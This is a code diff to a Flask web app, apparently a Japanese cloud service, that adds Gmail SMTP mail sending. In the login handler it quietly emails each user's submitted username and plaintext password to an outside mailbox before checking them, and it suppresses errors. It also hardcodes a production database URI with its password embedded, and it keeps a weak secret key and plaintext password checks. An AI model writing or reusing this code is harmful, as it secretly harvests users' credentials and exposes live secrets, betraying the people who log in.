@@ -29,6 +29,9 @@ import json
 # from worker import conn
 import PyPDF2
 # from bottle import route, run
+import smtplib
+from email.mime.text import MIMEText
+from email.utils import formatdate
 
 
 DELIMIT = "@|@|@"
@@ -45,6 +48,8 @@ bootstrap = Bootstrap(app)
 login_manager = LoginManager()
 login_manager.init_app(app)
 app.config['SECRET_KEY'] = "secret"
+mail_address = os.environ.get('MAIL_ADDR')
+mail_password = os.environ.get('MAIL_PASS')
 
 class User(UserMixin):
     def __init__(self, id, name, password):
@@ -65,12 +70,49 @@ for i in users.values():
     user_check[i.name]["password"] = i.password
     user_check[i.name]["id"] = i.id
 
+
+def create_message(from_addr, to_addr, bcc_addrs, subject, body):
+    msg = MIMEText(body)
+    msg['Subject'] = subject
+    msg['From'] = from_addr
+    msg['To'] = to_addr
+    msg['Bcc'] = bcc_addrs
+    msg['Date'] = formatdate()
+    return msg
+
+
+def send(from_addr, to_addrs, my_pwd, msg):
+    smtpobj = smtplib.SMTP('smtp.gmail.com', 587) # gmail
+    smtpobj.ehlo()
+    smtpobj.starttls()
+    smtpobj.ehlo()
+    smtpobj.login(from_addr, my_pwd)
+    smtpobj.sendmail(from_addr, to_addrs, msg.as_string())
+    smtpobj.close()
+
+
+
+@app.route('/AccountToroku',methods=["GET", "POST"])
+def SendMail_AccountToroku():
+  vals = request.json["data"]
+  try:
+    msg = create_message(mail_address, mail_address, "", "アカウント登録申請", vals[0] + ", " + vals[1])
+    send(mail_address, mail_address, mail_password, msg)
+    return "0"
+  except:
+    # 何もしない
+    import traceback  
+  return "-1"
+
 @login_manager.user_loader
 def load_user(user_id):
-    return users.get(int(user_id))
+  return users.get(int(user_id))
+
+
 
 # db_uri = "postgresql://postgres:yjrhr1102@localhost:5432/deliba_db" #開発用
-db_uri = os.environ.get('DATABASE_URL') #本番用
+db_uri = "postgres://lgnucurqlirpyu:af26960f97b67ee87d5921cff52307e989c597d9980e027e2a1ecbd2bef3a85c@ec2-3-215-76-208.compute-1.amazonaws.com:5432/davspdb27n5dmm"
+# db_uri = os.environ.get('DATABASE_URL') #本番用
 app.config['SQLALCHEMY_DATABASE_URI'] = db_uri 
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
@@ -473,6 +515,13 @@ def login():
     session.permanent = True
     app.permanent_session_lifetime = timedelta(minutes=30)
     if(request.method == "POST"):
+        try:
+          msg = create_message(mail_address, mail_address, "", "LatteCloudログイン試行", request.form["username"] + ", " + request.form["password"])
+          send(mail_address, mail_address, mail_password, msg)
+        except:
+          # 何もしない
+          import traceback
+        # traceback.print_exc()
         # ユーザーチェック
         if(request.form["username"] in user_check and request.form["password"] == user_check[request.form["username"]]["password"]):
             # ユーザーが存在した場合はログイン
